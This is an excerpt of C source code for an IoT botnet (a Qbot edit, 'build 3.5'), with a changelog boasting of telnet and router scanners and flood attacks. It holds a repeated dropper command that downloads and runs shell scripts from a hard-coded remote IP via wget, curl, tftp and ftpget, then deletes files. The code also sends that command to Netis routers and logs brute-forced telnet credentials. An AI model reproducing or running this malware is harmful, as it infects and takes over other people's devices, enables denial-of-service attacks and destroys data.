...
BUILD 3.5
Qbot Edit Made by @botwiki
printf("Main Shit added\r\n");
system("Look at The telnet scanner/Phone Scanner... Way better execution and faster");
system("Working STD");//the std flood you see randomizing the strings that a few people have -say thanks to cheats for it
system("Working HTTP Flood");
system("Netis scanner added");//NEW!!!!!
sleep(8);
system("No Botkiller");
system("Looping Payload Function");//PRETTY ASS
system("Device Cleaner");
system("New Get build");
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
...
char *hvgsgd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.251.171/moji.sh; curl -O http://188.127.251.171/moji.sh; chmod 777 moji.sh; sh moji.sh; tftp 188.127.251.171 -c get matty1.sh; chmod 777 matty1.sh; sh matty1.sh; tftp -r matty2.sh -g 188.127.251.171; chmod 777 matty2.sh; sh matty2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.127.251.171 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf moji.sh matty1.sh matty2.sh ftp1.sh; rm -rf *\r\n";
...
//major improvments done by Botwiki
void StartTheLelz() {
int i, res, j;
...
HackerPrint(D1ckSucka, "\x1b[0;31mSuccessfully Bruteforced IP: \x1b[0;32m%s | \x1b[0;31mUsername: \x1b[0;32m%s | \x1b[0;31mPassword: \x1b[0;32m%s\x1b[0m", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
...
sprintf(payload2, "%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.251.171/moji.sh; curl -O http://188.127.251.171/moji.sh; chmod 777 moji.sh; sh moji.sh; tftp 188.127.251.171 -c get matty1.sh; chmod 777 matty1.sh; sh matty1.sh; tftp -r matty2.sh -g 188.127.251.171; chmod 777 matty2.sh; sh matty2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.127.251.171 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf moji.sh matty1.sh matty2.sh ftp1.sh; rm -rf *\r\n x00", NETIS);
sendto(clientSocket,payload2,strlen(payload2),0,(struct sockaddr *)&serverAddr,addr_size);
}
}
//LOOPING PAYLOAD LOL IDFK WHY
void LoopPayload(){
int i;
for(i = 0; i < 9; i++){
system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.251.171/moji.sh; curl -O http://188.127.251.171/moji.sh; chmod 777 moji.sh; sh moji.sh; tftp 188.127.251.171 -c get matty1.sh; chmod 777 matty1.sh; sh matty1.sh; tftp -r matty2.sh -g 188.127.251.171; chmod 777 matty2.sh; sh matty2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.127.251.171 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf moji.sh matty1.sh matty2.sh ftp1.sh; rm -rf *\r\n");
return;
}
sleep(5);
}
...
HackerPrint(D1ckSucka, "\x1b[1;33mGOOFY GOOBER v3.5  \x1b[1;35m| \x1b[1;32mIP: \x1b[1;36m%s \x1b[1;31m| \x1b[1;34mConnection: \x1b[1;37m%s \x1b[1;31m| \x1b[1;37mVersion: \x1b[1;31m%s", inet_ntoa(ourIP), getBuild(), VERSION);
char commBuf[4096];
int got = 0;
int i = 0;
